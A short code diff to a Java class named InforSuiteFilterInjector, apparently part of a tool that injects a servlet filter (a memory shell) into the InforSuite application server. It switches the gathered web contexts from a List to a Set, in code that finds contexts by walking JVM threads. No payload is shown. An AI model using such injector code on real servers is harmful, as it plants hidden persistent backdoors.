@@ -31,7 +31,7 @@ public class InforSuiteFilterInjector {
     }
 
     public InforSuiteFilterInjector() {
-        List<Object> contexts = null;
+        Set<Object> contexts = null;
         try {
             contexts = getContext();
         } catch (Throwable throwable) {
@@ -73,8 +73,8 @@ public class InforSuiteFilterInjector {
      * com.cvicse.loong.enterprise.web.WebModule
      * /usr/local/inforsuite/as/modules/web-glue.jar
      */
-    public List<Object> getContext() throws Exception {
-        List<Object> contexts = new ArrayList<Object>();
+    public Set<Object> getContext() throws Exception {
+        Set<Object> contexts = new HashSet<Object>();
         Set<Thread> threads = Thread.getAllStackTraces().keySet();
         for (Thread thread : threads) {
             if (thread.getName().contains("ContainerBackgroundProcessor")) {
